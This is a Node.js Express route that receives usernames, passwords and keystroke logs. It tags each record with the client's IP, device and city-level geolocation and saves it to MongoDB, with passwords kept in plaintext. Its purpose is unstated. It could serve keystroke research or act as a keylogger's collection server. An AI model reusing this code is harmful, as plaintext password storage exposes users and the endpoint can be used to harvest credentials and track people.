const express = require('express');
const router = express.Router();
const useragent = require('useragent');
const fetch = require('node-fetch'); // For IP geolocation
const requestIp = require('request-ip'); // Better IP detection

const { formatKeystrokes } = require('../services/keystrokeProcessor');
const KeystrokeLog = require('../models/KeystrokeLog');

// POST route to handle logging keystrokes
router.post('/', async (req, res) => {
  const { username, password, keystrokes } = req.body;

  // === Validate request body ===
  if (!username || !password || !Array.isArray(keystrokes)) {
    console.error('❌ Invalid request body:', req.body);
    return res.status(400).json({ message: 'Invalid payload: username, password, or keystrokes missing' });
  }

  try {
    // Step 1: Format keystrokes
    const formattedKeystrokes = formatKeystrokes(keystrokes).join('\n');

    // Step 2: Get IP using request-ip
    let ip = requestIp.getClientIp(req);
    if (!ip || ip === '::1' || ip.includes('127.0.0.1')) {
      ip = '103.29.245.1'; // fallback for local testing
    }

    // Step 3: User-Agent string
    const rawUA = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(rawUA);
    const device = `${agent.toAgent()} on ${agent.os.toString()}`;

    // Step 4: IP-based Location via ip-api
    let location = 'Unknown';
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}`);
      const geo = await response.json();
      if (geo.status === 'success') {
        location = `${geo.city || 'Unknown'}, ${geo.regionName || ''}, ${geo.country || ''}`.trim();
      }
    } catch (geoErr) {
      console.warn('⚠️ IP location lookup failed:', geoErr.message);
    }

    // Step 5: Save to MongoDB
    const log = new KeystrokeLog({
      username,
      password,
      keystrokes: formattedKeystrokes,
      ip,
      device,
      location,
    });

    await log.save();
    console.log("✅ Keystrokes stored in MongoDB.");

    // Step 6: Send Response
    res.status(200).json({ message: 'Keystrokes logged successfully to database.' });

  } catch (err) {
    console.error('❌ Error saving keystrokes to MongoDB:', err.message);
    res.status(500).json({ message: 'Server error while saving keystrokes.' });
  }
});

module.exports = router;
